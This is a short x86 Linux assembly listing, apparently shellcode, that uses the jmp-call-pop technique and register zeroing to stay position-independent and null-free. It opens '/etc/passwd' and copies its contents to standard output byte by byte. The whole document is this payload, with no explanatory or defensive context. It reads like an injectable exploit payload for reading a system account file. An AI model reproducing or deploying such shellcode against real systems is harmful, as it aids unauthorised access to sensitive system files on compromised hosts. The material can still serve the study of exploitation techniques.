.globl	_start

_start:
	xor %eax, %eax
	xor %ebx, %ebx
	xor %ecx, %ecx
	xor %edx, %edx
	jmp two

open:
	pop %ebx
	movb $5, %al	/* sys_open */
	xor %ecx, %ecx
	int $0x80

	test %eax, %eax
	js exit
	mov %eax, %esi
	jmp read

exit:
	xor %eax, %eax
	movb $1, %al	/* sys_exit */
	xor %ebx, %ebx
	int $0x80

read:
	mov %esi, %ebx
	movb $3, %al	/* sys_read */
	sub $1, %esp
	lea (%esp), %ecx
	movb $1, %dl
	int $0x80

	xor %ebx, %ebx
	cmp %eax, %ebx
	je  exit

	movb $4, %al	/* sys_write */
	movb $1, %bl
	movb $1, %dl
	int $0x80

	add $1, %esp
	jmp read

two:
	call    open
	.string "/etc/passwd"
